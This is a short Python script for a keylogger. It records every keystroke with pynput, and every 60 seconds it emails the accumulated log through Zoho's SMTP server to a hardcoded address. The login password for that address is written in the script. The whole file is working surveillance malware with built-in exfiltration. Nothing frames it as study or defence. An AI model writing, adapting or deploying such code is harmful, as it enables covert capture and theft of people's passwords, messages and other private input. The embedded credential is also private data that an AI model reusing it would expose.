import smtplib
import pynput.keyboard
import threading
from email.mime.text import MIMEText
class Keylogger:
    def __init__(self, time_intrevel, email, pssd):
        self.log = " KeyLogger Started !!!!"
        self.intrevel = time_intrevel
        self.email = email
        self.pssd = pssd
    def append_log(self, string):
        self.log = self.log + string

    def keypress(self, key):
        try:
            ck= str(key.char)
        except AttributeError:
            if key == key.space:
                ck = " "
            else:
                ck = " " + str(key) + " "
        self.append_log(ck)

    def report(self):

        print(self.log)
        self.mail(self.email, self.pssd, "\n\n"+self.log)
        self.log = " "
        timer = threading.Timer(self.intrevel, self.report)
        timer.start()
        print(self.log)

    def mail(self, email, pssd, mssg):
        server = smtplib.SMTP_SSL('smtp.zoho.com', 465)
        msg = MIMEText(mssg)
        msg['Subject'] = "Sent from python"
        msg['From'] = email
        msg['To'] = email
        
        #server.ehlo()
        #server.starttls()
        
        server.login(email, pssd)
        server.sendmail(email, email, msg.as_string())

        server.quit()

    def start(self):
        listner = pynput.keyboard.Listener(on_press = self.keypress)
        with listner:
            self.report()
            listner.join()

hack = Keylogger(60, "te001st@zohomail.com", "QWerty@1234")
hack.start()
